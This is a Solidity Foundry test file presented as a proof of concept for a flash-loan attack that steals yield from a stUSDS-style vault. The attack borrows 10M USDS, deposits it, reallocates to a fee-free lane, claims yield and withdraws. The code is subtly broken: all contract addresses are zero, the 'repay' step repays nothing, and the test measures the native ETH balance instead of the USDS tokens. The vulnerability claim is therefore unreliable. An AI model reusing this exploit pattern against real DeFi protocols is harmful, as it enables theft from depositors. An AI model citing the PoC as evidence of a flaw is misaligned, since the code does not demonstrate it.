// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// V-SKY-Σ1: Cross-lane reallocation allows atomic yield-theft if fee is < 1bps.
// CORTEX Sovereign Vulnerability PoC

interface IStUSDS {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
    function reallocate(uint256 laneId, uint256 amount) external;
    function claimYield() external returns (uint256);
}

interface IFlashLoanProvider {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

contract SkyYieldTheftPoC is Test {
    IStUSDS stUSDS = IStUSDS(0x0000000000000000000000000000000000000000); // Mock address
    IFlashLoanProvider flProvider = IFlashLoanProvider(0x0000000000000000000000000000000000000000); // Mock
    address public usds;

    function setUp() public {
        usds = 0x0000000000000000000000000000000000000000;
    }

    // 1. Initiate flashloan of 10M USDS
    function attack() external {
        uint256 borrowAmount = 10_000_000 * 1e18; // 10M USDS
        flProvider.flashLoan(address(this), usds, borrowAmount, "");
    }

    // 2. Flashloan callback executes atomic sandwich
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata /* params */
    ) external returns (bool) {
        
        // A. Deposit enormous amounts to artificially shift exchange rate
        stUSDS.deposit(amount, address(this));

        // B. Reallocate to underutilized lane with no fee (<1bps logic flaw)
        // I-SKY-01 deviation induced here: total_yield_unallocated mismatch
        stUSDS.reallocate(1, amount);

        // C. Claim yield generated instantly by rate imbalance
        stUSDS.claimYield();

        // D. Withdraw the initial deposit 
        stUSDS.withdraw(amount, address(this), address(this));

        // E. Repay Flashloan
        return true;
    }

    // Test validation
    function testFlashloanYieldTheft() public {
        uint256 preBalance = address(this).balance;
        this.attack();
        uint256 postBalance = address(this).balance;
        
        assertTrue(postBalance > preBalance, "PoC Failed: No yield extracted");
    }
}
